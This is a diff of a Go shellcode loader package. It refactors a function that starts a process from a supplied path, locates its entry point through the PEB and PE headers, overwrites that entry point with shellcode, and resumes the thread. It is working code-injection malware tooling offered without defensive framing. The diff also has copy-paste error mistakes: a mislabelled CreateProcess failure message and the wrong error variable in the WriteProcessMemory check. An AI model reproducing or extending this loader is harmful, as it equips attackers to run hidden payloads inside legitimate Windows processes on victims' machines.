@@ -2,15 +2,15 @@ package loader
 
 import (
 	"encoding/binary"
+	"fmt"
 	"unsafe"
-	"variant/log"
 	"variant/wdll"
 	"variant/xwindows"
 
 	"golang.org/x/sys/windows"
 )
 
-func NoRwx(shellcode []byte) {
+func NoRwx(shellcode []byte, path string) error {
 	var info int32
 	var returnLength int32
 
@@ -18,9 +18,9 @@ func NoRwx(shellcode []byte) {
 	var si windows.StartupInfo
 	var pi windows.ProcessInformation
 
-	err := windows.CreateProcess(
+	cpErr := xwindows.CreateProcessW(
 		nil,
-		windows.StringToUTF16Ptr("C:\\Windows\\System32\\notepad.exe"),
+		windows.StringToUTF16Ptr(path),
 		nil,
 		nil,
 		false,
@@ -30,19 +30,19 @@ func NoRwx(shellcode []byte) {
 		&si,
 		&pi,
 	)
-	if err != nil {
-		log.Fatal(err)
+	if cpErr != nil {
+		return fmt.Errorf("NtQueryInformationProcess failed: %w", cpErr)
 	}
 
-	_, ntErr := xwindows.NtQueryInformationProcessZ(
+	_, ntErr := xwindows.NtQueryInformationProcess(
 		pi.Process,
-		uintptr(info),
-		uintptr(unsafe.Pointer(&pbi)),
+		uint32(info),
+		unsafe.Pointer(&pbi),
 		unsafe.Sizeof(windows.PROCESS_BASIC_INFORMATION{}),
-		uintptr(unsafe.Pointer(&returnLength)),
+		(*uintptr)(unsafe.Pointer(&returnLength)),
 	)
 	if ntErr != nil {
-		log.Fatalf("NtQueryInformationProcessZ failed: %w", ntErr)
+		return fmt.Errorf("NtQueryInformationProcess failed: %w", ntErr)
 	}
 
 	pebOffset := uintptr(unsafe.Pointer(pbi.PebBaseAddress)) + 0x10
@@ -58,28 +58,34 @@ func NoRwx(shellcode []byte) {
 	   );
 	*/
 
-	wdll.ReadProcessMemory().Call(
-		uintptr(pi.Process),
+	rpErr := xwindows.ReadProcessMemory(
+		pi.Process,
 		pebOffset,
-		uintptr(unsafe.Pointer(&imageBase)),
+		(*byte)(unsafe.Pointer(&imageBase)),
 		8,
-		0,
+		nil,
 	)
+	if rpErr != nil {
+		return fmt.Errorf("ReadProcessMemory imageBase failed: %w", rpErr)
+	}
 
 	headersBuffer := make([]byte, 4096)
 
-	wdll.ReadProcessMemory().Call(
-		uintptr(pi.Process),
-		uintptr(imageBase),
-		uintptr(unsafe.Pointer(&headersBuffer[0])),
+	rpmErr := xwindows.ReadProcessMemory(
+		pi.Process,
+		imageBase,
+		&headersBuffer[0],
 		4096,
-		0,
+		nil,
 	)
+	if rpmErr != nil {
+		return fmt.Errorf("ReadProcessMemory headersBuffer failed: %w", rpmErr)
+	}
 
 	// Parse DOS header e_lfanew entry to calculate entry point address
 	var dosHeader wdll.IMAGE_DOS_HEADER
 	dosHeader.E_lfanew = binary.LittleEndian.Uint32(headersBuffer[60:64])
-	ntHeader := (*wdll.IMAGE_NT_HEADER)(unsafe.Pointer(uintptr(unsafe.Pointer(&headersBuffer[0])) + uintptr(dosHeader.E_lfanew)))
+	ntHeader := (*xwindows.IMAGE_NT_HEADER)(unsafe.Pointer(uintptr(unsafe.Pointer(&headersBuffer[0])) + uintptr(dosHeader.E_lfanew)))
 	codeEntry := uintptr(ntHeader.OptionalHeader.AddressOfEntryPoint) + imageBase
 
 	/*
@@ -92,15 +98,21 @@ func NoRwx(shellcode []byte) {
 	   );
 	*/
 
-	var zero *uintptr
-	xwindows.WriteProcessMemory(
+	wpErr := xwindows.WriteProcessMemory(
 		pi.Process,
 		codeEntry,
 		&shellcode[0],
 		uintptr(len(shellcode)),
-		zero,
+		nil,
 	)
+	if wpErr != nil {
+		return fmt.Errorf("WriteProcessMemory failed: %w", rpmErr)
+	}
 
-	xwindows.ResumeThread(pi.Thread)
+	_, rtErr := xwindows.ResumeThread(pi.Thread)
+	if rtErr != nil {
+		return fmt.Errorf("ResumeThread failed: %w", rtErr)
+	}
 
+	return nil
 }
